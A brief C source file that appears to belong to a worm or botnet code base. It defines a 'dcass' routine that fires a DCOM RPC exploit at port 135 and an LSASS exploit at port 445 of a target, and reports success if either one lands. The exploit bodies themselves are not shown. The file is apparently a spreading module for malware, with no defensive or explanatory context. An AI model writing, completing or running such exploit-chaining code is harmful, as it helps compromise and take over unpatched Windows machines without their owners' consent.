

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_DCASS
BOOL dcass(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}
#endif
#endif
#endif